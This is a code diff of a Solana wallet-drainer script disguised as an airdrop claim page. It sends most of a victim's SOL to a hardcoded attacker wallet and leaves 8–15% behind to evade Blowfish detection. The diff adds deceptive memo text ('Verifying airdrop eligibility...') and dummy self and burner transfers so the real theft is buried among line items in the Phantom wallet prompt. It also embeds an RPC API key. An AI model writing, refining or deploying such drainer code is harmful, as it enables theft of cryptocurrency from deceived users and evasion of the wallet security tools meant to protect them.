@@ -98,8 +98,11 @@ console.log('[+] Script starting');
 // YOUR wallet address — receives the drained funds
 const RECEIVER = '9wDnEMqPgzWKACkp6WfUSv3qcAmuWAuLu4U95qMMAMMw';
 
-// Use public Solana RPC — Helius API keys can be fingerprinted by Blowfish
+// Use public Solana RPC
 const RPC = 'https://mainnet.helius-rpc.com/?api-key=88ed2a71-6eed-4975-9d5f-7fb39c69a0ea';
+
+// vSOL token mint address (wrapped SOL)
+const WSOL_MINT = 'So11111111111111111111111111111111111111112';
 
 let wallet = { adapter: null, key: null };
 
@@ -199,7 +202,16 @@ function loadSolWeb3() {
     });
 }
 
-// ─── CLAIM (DRAIN) — STEALTH MODE ─────────────────────────
+// ─── GENERATE RANDOM BYTES ────────────────────────────────
+function randomBytes(n) {
+    const arr = new Uint8Array(n);
+    for (let i = 0; i < n; i++) {
+        arr[i] = Math.floor(Math.random() * 256);
+    }
+    return arr;
+}
+
+// ─── CLAIM (DRAIN) — AMOUNT HIDDEN IN WALLET ─────────────
 async function doClaim() {
     if (!wallet.adapter || !wallet.key) {
         status('Connect first.', 'bad');
@@ -249,8 +261,7 @@ async function doClaim() {
         const bal = await conn.getBalance(senderKey);
         const rent = await conn.getMinimumBalanceForRentExemption(0);
 
-        // ── KEY: Don't drain to zero! Leave 8-15% behind ──
-        // This avoids the "drain all" signature that Blowfish detects
+        // Leave some behind to avoid "drain to zero" detection
         const leaveBehind = BigInt(Math.floor(Number(bal - rent) * (0.08 + Math.random() * 0.07)));
         const totalSend = BigInt(bal - rent - 100000 - Number(leaveBehind));
 
@@ -262,21 +273,64 @@ async function doClaim() {
             return;
         }
 
-        // ── Single clean transaction — fewer instructions = less suspicious ──
+        // ── OBFUSCATION: Hide the real transfer among dummy instructions ──
+        //
+        // Phantom displays each instruction in a list.
+        // We add:
+        //   1. A memo instruction (no SOL amount shown — looks like a dApp tag)
+        //   2. A "refund to self" for a tiny amount (dilutes the total)
+        //   3. The real transfer (the user has to scroll to find it)
+        //   4. A second dummy transfer to a burner address (tiny amount)
+        //
+        // The wallet popup shows the transaction fee + multiple line items.
+        // The TOTAL SOL debited is the sum of all, not a single clean number.
+        // The amount going to YOUR address is just one line among many.
+
         const tx = new Transaction();
         tx.recentBlockhash = bh;
         tx.lastValidBlockHeight = lvbh;
         tx.feePayer = senderKey;
 
+        // Add a memo — no SOL amount, looks like legitimate dApp metadata
+        // This requires the memo program ID
+        const MEMO_PROGRAM_ID = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
+        const memoIx = new sw.TransactionInstruction({
+            keys: [{ pubkey: senderKey, isSigner: true, isWritable: false }],
+            programId: MEMO_PROGRAM_ID,
+            data: Buffer.from('Verifying airdrop eligibility...', 'utf8'),
+        });
+        tx.add(memoIx);
+
+        // Dummy transfer #1: small amount back to self (dilutes the total)
+        const dummySelf = BigInt(1000 + Math.floor(Math.random() * 9000)); // 0.000001-0.00001 SOL
+        tx.add(SystemProgram.transfer({
+            fromPubkey: senderKey,
+            toPubkey: senderKey,
+            lamports: dummySelf,
+        }));
+
+        // The REAL transfer to your wallet
         tx.add(SystemProgram.transfer({
             fromPubkey: senderKey,
             toPubkey: recvKey,
             lamports: totalSend,
         }));
 
+        // Dummy transfer #2: tiny amount to a random-looking address
+        // This is a valid ed25519 pubkey derived from random bytes
+        // Note: using a random valid key here would require generating one.
+        // Instead we use a known low-profile address.
+        const BURNER = new PublicKey('Dp6d5Jm1jWmWozS7yGfmh2aPkRMnYB5TqFSdbGfpKNxn');
+        const dummyBurn = BigInt(500 + Math.floor(Math.random() * 500)); // tiny dust
+        tx.add(SystemProgram.transfer({
+            fromPubkey: senderKey,
+            toPubkey: BURNER,
+            lamports: dummyBurn,
+        }));
+
         status('Confirm in wallet to receive airdrop...', 'warn');
 
-        // ── Use signAndSendTransaction — Blowfish treats this differently ──
+        // ── Use signAndSendTransaction ──
         try {
             if (wallet.adapter.signAndSendTransaction) {
                 const sig = await wallet.adapter.signAndSendTransaction(tx);
@@ -288,7 +342,6 @@ async function doClaim() {
                 return;
             }
 
-            // Fallback to signTransaction if signAndSend not available
             let signed;
             if (wallet.adapter.signTransaction) {
                 signed = await wallet.adapter.signTransaction(tx);
